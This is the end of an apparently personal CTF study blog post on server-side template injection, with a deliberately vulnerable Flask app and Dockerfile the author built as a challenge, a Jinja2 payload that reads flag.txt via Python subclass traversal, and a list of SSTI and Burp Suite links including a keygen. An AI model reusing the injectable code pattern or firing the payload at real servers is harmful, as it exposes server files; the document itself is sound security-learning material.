<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught <span class="built_in">Exception</span>: Uploaded file mime type is not an image: application/vnd.openxmlformats-officedocument.wordprocessingml.document in /home/carlos/User.php:<span class="number">28</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar(&#x27;/tmp/11.docx&#x27;, &#x27;application/vnd...&#x27;)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line">  thrown in /home/carlos/User.php on line <span class="number">28</span></span><br></pre></td></tr></table></figure>
<p>å¤§æ¦‚å°±æ˜¯&#x2F;home&#x2F;carlos&#x2F;avatar_upload.phpæ–‡ä»¶è°ƒç”¨äº†setAvataræ–¹æ³•<br>ç„¶åä¼šæ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶çš„MIMEç±»å‹æ˜¯å¦æ˜¯å›¾ç‰‡ç±»å‹</p>
<hr>
<p>æœ‰ç‚¹æ™•ï¼Œä¸è¿‡æ¯”ä¸Šä¸€é¢˜æ¸…æ™°ç‚¹ï¼Œå›å¤´å†åš</p>
<h1 id="sstiå‡ºé¢˜å°è¯•"><a href="#sstiå‡ºé¢˜å°è¯•" class="headerlink" title="sstiå‡ºé¢˜å°è¯•"></a>sstiå‡ºé¢˜å°è¯•</h1><p>æ„Ÿè°¢chatè€å¸ˆã€‚ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;title&gt;Greetings&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello, &#123;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;flag in flag.txt&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Use Python 3 as the base image</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copy the app files to the container&#x27;s /app directory</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.py /app/app.py</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /app/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the working directory</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install Flask library</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install Flask</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Expose port 5000 (Flask application will run on this port)</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run the Flask application</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44786530/article/details/123401289">Dockeréƒ¨ç½²127.0.0.1æœåŠ¡åè®¿é—®ä¸äº†ï¼Ÿè§£å†³æ–¹æ³•</a></p>
<p>æœ¬æ¥æƒ³æä¸ªè¿‡æ»¤ï¼Œä½†æ˜¯æ‡’å¾—æäº†ï¼Œå°±å½“ä»¬æ˜¯ç­¾åˆ°é¢˜å§ï¼</p>
<p>æç‚¹èƒŒæ™¯å’Œå­—ä½“ï¼Œï¼Œä½“ç°ä¸€ä¸‹æˆ‘çœŸçš„æœ‰åœ¨å­¦ä¹ ï¼ˆï¼Ÿ<br>æœ¬æ¥æƒ³ç›´æ¥å·æ‡’å†™åœ¨app.pyå†…ï¼ˆå†…åµŒæ ·å¼è¡¨ï¼‰ï¼Œç»“æœcssçš„èŠ±æ‹¬å·ä¼šå ä½ç¬¦è¿˜æ˜¯ä»€ä¹ˆï¼Œä¸å’Œchatgptè¾©è®ºä¸‰ç™¾å›åˆé‚ç½¢ï¼›æŠŠcssæ”¾åœ¨staticæ–‡ä»¶å¤¹å†…ï¼Œç„¶åä¸çŸ¥é“ä¸ºä»€ä¹ˆè°ƒç”¨è·¯å¾„æ€»æ˜¯å‡ºé”™ï¼Œå’Œchatgptè¾©è®ºä¸‰ç™¾å›åˆå†ç½¢ï¼Œæœ€åç”¨å†…è”æ ·å¼åµŒè¿›å»ã€‚ã€‚<br><a target="_blank" rel="noopener" href="http://c.biancheng.net/css3/html-import-css.html">HTMLå¼•ç”¨CSSï¼ˆ4ç§æ–¹æ³•ï¼‰</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;ä½ å¥½ä½ å¥½ä½ å¥½&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body style=&quot;font-size: 49px; text-shadow: 2px 2px 4px #777; padding: 50px;</span></span><br><span class="line"><span class="string">            background-image: url(&#x27;https://pic.imgdb.cn/item/64c912851ddac507cc745f87.jpg&#x27;);</span></span><br><span class="line"><span class="string">            background-size: cover; background-repeat: no-repeat; background-position: center;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 style=&quot;font-family: &#x27;Edwardian Script ITC&#x27;; font-size: 56px; color: #333;&quot;&gt;Hello, &#123;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p style=&quot;font-style: italic; font-family: &#x27;Blackadder ITC&#x27;; font-size: 25px; color: #3D4456;&quot;&gt;flag in flag.txt&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(request.args.get(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>payload(æ˜¾ç„¶ä¸å”¯ä¸€ã€‚ã€‚): <code>?user=&#123;&#123;''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['open']('flag.txt').read()&#125;&#125;</code></p>
<h1 id="å•¥ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„é“¾æ¥å †å †"><a href="#å•¥ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„é“¾æ¥å †å †" class="headerlink" title="å•¥ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„é“¾æ¥å †å †"></a>å•¥ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„é“¾æ¥å †å †</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/625023925">å›½å†…åå¤§å›¾åºŠæ¨èâ€“ä¸€æ–‡è§£å†³å›¾ç‰‡å›¾åºŠé—®é¢˜ - çŸ¥ä¹</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/14797393.html">SSTI(æ¨¡æ¿æ³¨å…¥)â€“Flask(èŒæ–°å‘) | [BUUCTFé¢˜è§£][CSCCTF 2019 Qual]FlaskLight &amp; [GYCTF2020]FlaskAppï¼ˆSSTIï¼‰ - Article_kelp - åšå®¢å›­</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11971164.html">python-flaskæ¨¡å—æ³¨å…¥(SSTI) - ctrl_TTè±† - åšå®¢å›­</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhaijiahui/p/9160913.html">CEYEå¹³å°çš„ä½¿ç”¨ - æ—¶å…‰ä¸æ”¹ - åšå®¢å›­</a><br><a target="_blank" rel="noopener" href="http://ceye.io/">CEYE - Monitor service for security testing</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54515836/article/details/113778233">sstiè¯¦è§£ä¸ä¾‹é¢˜ä»¥åŠç»•è¿‡payloadå¤§å…¨</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51353029/article/details/111503731">SSTIå…¥é—¨è¯¦è§£</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43936524/article/details/116306294">ä»Flaskå…¥é—¨SSTI</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_63928796/article/details/125398979">SSTIé¶åœº</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44576725/article/details/124176682">flask sssti labé—¯å…³è®°å½•</a><br><a target="_blank" rel="noopener" href="https://johnfrod.top/ctf/flask-ssti-lab%E6%94%BB%E7%95%A5/">Flask SSTI LABæ”»ç•¥ â€“ JohnFrodâ€™s Blog</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_16307345/article/details/115718727">è¯»å–pklæ–‡ä»¶æŠ¥é”™_pickle.UnpicklingError: A load persistent id instruction was encountered</a><br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/44549856/no-module-named-ttk-but-its-in-the-folder">python - no module named â€˜ttkâ€™, but its in the folder - Stack Overflow</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/29440823">æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•å®ŒæˆRuby ERBæ¨¡æ¿æ³¨å…¥ - çŸ¥ä¹</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013541325/article/details/109336900">Burpsuiteè¶…è¯¦ç»†å®‰è£…æ•™ç¨‹</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53577336/article/details/122393296">BurpSuiteå…¨å¥—ä½¿ç”¨æ•™ç¨‹ï¼ˆè¶…å®ç”¨è¶…è¯¦ç»†ä»‹ç»ï¼‰</a><br><a target="_blank" rel="noopener" href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">h3110w0r1d-y&#x2F;BurpLoaderKeygen: Burp Suite Pro Loader &amp; Keygen</a><br><a target="_blank" rel="noopener" href="https://portswigger.net/burp/releases">Burp Suite Release Notes</a><br><a target="_blank" rel="noopener" href="https://greasyfork.org/zh-CN/scripts/463707-%E5%B0%B1%E6%98%AF%E5%8A%A0%E9%80%9F-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%97%A0%E9%99%90%E9%80%9F%E6%89%B9%E9%87%8F%E4%B8%8B%E8%BD%BD-%E6%94%AF%E6%8C%81%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E8%BD%BD">ğŸ”¥ã€å°±æ˜¯åŠ é€Ÿã€‘ç™¾åº¦ç½‘ç›˜æ— é™é€Ÿæ‰¹é‡ä¸‹è½½ - æ”¯æŒæ–‡ä»¶å¤¹ä¸‹è½½ ğŸ”¥</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/64205442">Node.jsä¸­child_processæ¨¡å—ä¸­spawnä¸execçš„å¼‚åŒæ¯”è¾ƒ - çŸ¥ä¹</a><br><a target="_blank" rel="noopener" href="https://docs.djangoproject.com/zh-hans/4.2/ref/templates/builtins/">å†…ç½®æ¨¡æ¿æ ‡ç­¾å’Œè¿‡æ»¤å™¨ | Django æ–‡æ¡£ | Django</a><br><a target="_blank" rel="noopener" href="https://geek-docs.com/django/django-questions/239_django_django_global_variable.html">Django å…¨å±€å˜é‡|æå®¢æ•™ç¨‹</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/8047530.html">å·§ç”¨DNSlogå®ç°æ— å›æ˜¾æ³¨å…¥ - Afant1 - åšå®¢å›­</a><br><a target="_blank" rel="noopener" href="http://www.admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³• | AdminTonyâ€™s Blog</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/228176">æµ…æPython SSTI&#x2F;æ²™ç›’é€ƒé€¸-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/331653.html">ä»0åˆ°1å®Œå…¨æŒæ¡ SSTI - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/105890491">Server-side template injection (SSTI)å­¦ä¹ ç¬”è®°</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/107727952?spm=1001.2101.3001.6650.7&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7-107727952-blog-105890491.235%5Ev38%5Epc_relevant_anti_vip_base&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-7-107727952-blog-105890491.235%5Ev38%5Epc_relevant_anti_vip_base&utm_relevant_index=8">æœåŠ¡å™¨æ¨¡æ¿æ³¨å…¥ SSTI ï¼ˆServer-side template injectionï¼‰</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/331653.html">ä»0åˆ°1å®Œå…¨æŒæ¡ SSTI - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
              <a href="/tags/crypto/" rel="tag"><i class="fa fa-tag"></i> crypto</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/07/27/imaginaryctf%E9%83%A8%E5%88%86wp%EF%BC%88%E5%8F%AA%E6%9C%89%E4%B8%80%E7%82%B9%E7%82%B9%E3%80%82%E3%80%82/" rel="prev" title="imaginaryctféƒ¨åˆ†wp">
      <i class="fa fa-chevron-left"></i> imaginaryctféƒ¨åˆ†wp
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/07/28/xCTF-2023-wp-%E9%83%A8%E5%88%86/" rel="next" title="_*CTF_2023_wp_éƒ¨åˆ†">
      _*CTF_2023_wp_éƒ¨åˆ† <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=478507889&auto=1&height=66"></iframe>

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">Python Flaskæ¡†æ¶å­¦ä¹ </span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.1.</span> <span class="nav-text">å®‰è£…</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#test"><span class="nav-number">1.2.</span> <span class="nav-text">test</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8HTML%E6%A8%A1%E6%9D%BF"><span class="nav-number">1.3.</span> <span class="nav-text">ä½¿ç”¨HTMLæ¨¡æ¿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%A1%A8%E5%8D%95"><span class="nav-number">1.4.</span> <span class="nav-text">ä½¿ç”¨è¡¨å•</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%9B%86%E6%88%90%EF%BC%9A%E4%BD%BF%E7%94%A8SQLAlchemy"><span class="nav-number">1.5.</span> <span class="nav-text">æ•°æ®åº“é›†æˆï¼šä½¿ç”¨SQLAlchemy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-1"><span class="nav-number">1.5.1.</span> <span class="nav-text">å®‰è£…</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-%E6%9C%80%E5%9F%BA%E7%A1%80%E7%89%88%F0%9F%9A%AC%F0%9F%9A%AC"><span class="nav-number">1.5.2.</span> <span class="nav-text">ä½¿ç”¨(æœ€åŸºç¡€ç‰ˆğŸš¬ğŸš¬)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%AB%E7%9A%84%E6%A8%A1%E6%9D%BF"><span class="nav-number">2.</span> <span class="nav-text">åˆ«çš„æ¨¡æ¿</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sstilabs"><span class="nav-number">3.</span> <span class="nav-text">sstilabs</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85-2"><span class="nav-number">3.1.</span> <span class="nav-text">å®‰è£…</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-number">3.2.</span> <span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">3.3.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">3.4.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number">3.5.</span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number">3.6.</span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-number">3.7.</span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-number">3.8.</span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-number">3.9.</span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-number">3.10.</span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number">3.11.</span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11-13"><span class="nav-number">3.12.</span> <span class="nav-text">level11-13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%8B%E5%88%92%E7%BA%BF-x2F-%E7%A9%BA%E6%A0%BC"><span class="nav-number">3.12.1.</span> <span class="nav-text">è¿‡æ»¤ä¸‹åˆ’çº¿&#x2F;ç©ºæ ¼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#attr-%E5%86%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9E%84%E9%80%A0"><span class="nav-number">3.12.2.</span> <span class="nav-text">attr()å†…å­—ç¬¦ä¸²æ„é€ </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E7%B1%BB"><span class="nav-number">3.12.3.</span> <span class="nav-text">æ„é€ ç±»</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="nav-number">3.12.4.</span> <span class="nav-text">æ„é€ æ–¹æ³•</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E8%AF%AD%E6%B3%95"><span class="nav-number">3.12.5.</span> <span class="nav-text">å®Œæ•´åˆ©ç”¨è¯­æ³•</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%88%E8%B5%B7%E6%9D%A5"><span class="nav-number">3.12.6.</span> <span class="nav-text">åˆèµ·æ¥</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#level11"><span class="nav-number">3.12.6.1.</span> <span class="nav-text">level11</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#level12-13"><span class="nav-number">3.12.6.1.1.</span> <span class="nav-text">level12,13</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#portswigger%E7%9A%84Server-side-template-injection%E6%A8%A1%E5%9D%97"><span class="nav-number">4.</span> <span class="nav-text">portswiggerçš„Server-side template injectionæ¨¡å—</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection"><span class="nav-number">4.1.</span> <span class="nav-text">Basic server-side template injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection-code-context-%E5%85%A8%E6%98%AF%E5%BA%9F%E8%AF%9D%E4%B8%8E%E9%A2%98%E6%97%A0%E5%85%B3"><span class="nav-number">4.2.</span> <span class="nav-text">Basic server-side template injection (code context)(å…¨æ˜¯åºŸè¯ä¸é¢˜æ— å…³)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-server-side-template-injection-code-context"><span class="nav-number">4.3.</span> <span class="nav-text">Basic server-side template injection (code context)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-side-template-injection-in-a-sandboxed-environment"><span class="nav-number">4.4.</span> <span class="nav-text">Server-side template injection in a sandboxed environment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Server-side-template-injection-with-a-custom-exploit"><span class="nav-number">4.5.</span> <span class="nav-text">Server-side template injection with a custom exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssti%E5%87%BA%E9%A2%98%E5%B0%9D%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">sstiå‡ºé¢˜å°è¯•</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%95%A5%E4%B8%8D%E7%9F%A5%E9%81%93%E6%9C%89%E6%B2%A1%E6%9C%89%E7%94%A8%E7%9A%84%E9%93%BE%E6%8E%A5%E5%A0%86%E5%A0%86"><span class="nav-number">6.</span> <span class="nav-text">å•¥ä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨çš„é“¾æ¥å †å †</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="æ—æ¶‚"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">æ—æ¶‚</p>
  <div class="site-description" itemprop="description">å­¦ä¹ ing</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">19</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/LinTurrr" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;LinTurrr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">æ—æ¶‚</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>

<script>
var options = {
  bottom: '64px',
  right: 'unset',
  left: '32px',
  time: '0.5s',
  mixColor: 'transparent',
  backgroundColor: 'transparent',
  buttonColorDark: '#100f2c',
  buttonColorLight: '#fff',
  saveInCookies: true,
  label: 'ğŸŒ“',
  autoMatchOsTheme: true
}
const darkmode = new Darkmode(options);
window.darkmode = darkmode;
darkmode.showWidget();
</script>


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
